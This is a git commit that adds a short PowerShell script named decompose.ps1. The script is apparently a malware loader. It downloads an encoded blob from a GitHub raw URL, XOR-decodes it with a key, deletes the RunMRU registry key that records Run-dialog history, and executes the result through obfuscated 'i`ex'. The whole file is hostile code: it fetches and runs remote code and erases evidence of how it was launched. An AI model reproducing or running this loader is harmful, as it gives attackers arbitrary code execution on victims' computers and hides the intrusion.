bed25eebe7b68130629428e1709b0e012e7e28a4
Bongman1234 <164390870+Bongman1234@users.noreply.github.com>
2025-06-01 12:25:44 +0100

    Create decompose.ps1

---
+++ decompose.ps1
@@ -0,0 +1,17 @@
+ function cappybara {
+    param ([string]$sec,[string]$bty)
+    $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
+    $accent = ""
+    for ($i = 0; $i -lt $ajd.Length; $i++) {
+        $osn = [int]$ajd[$i] -bxor [int]$bty[$i % $bty.Length]
+        $accent += [char]$osn
+    }
+    return $accent
+}
+$k = "$k"
+$mirrage = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
+$triphook = cappybara -sec $mirrage -bty $k
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+$triphook | i`ex
